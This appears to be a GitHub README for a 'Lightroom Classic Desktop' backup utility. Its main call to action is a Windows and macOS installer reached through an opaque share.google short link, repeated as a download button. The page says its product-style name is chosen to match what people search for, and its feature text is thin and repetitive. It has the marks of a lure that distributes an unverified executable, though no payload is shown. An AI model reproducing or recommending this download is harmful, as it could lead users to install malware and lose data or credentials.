![Lightroom Classic Desktop](assets/hero.png)

# Lightroom Classic Desktop

*Keep the Lightroom Classic project folder tidy before an update.*

## About

This repository is **Lightroom Classic Desktop**, a Windows utility. Keep the Lightroom Classic project folder tidy before an update.

Lightroom Classic preset and export files hide under AppData and Documents.

The CLI in this repository is the documented interface; the desktop build is the same job in an installer.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Maps Lightroom Classic project and cache paths.
- Keeps a dated spare of preset and export files.
- Skips empty and temp folders.
- Leaves the original tree in place.

## Why it exists

A product-named desktop helper matches how people look for it.

Local copies only. No account step.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/d-ruiz-3864/lightroom-classic-desktop

MIT license. See `LICENSE`.
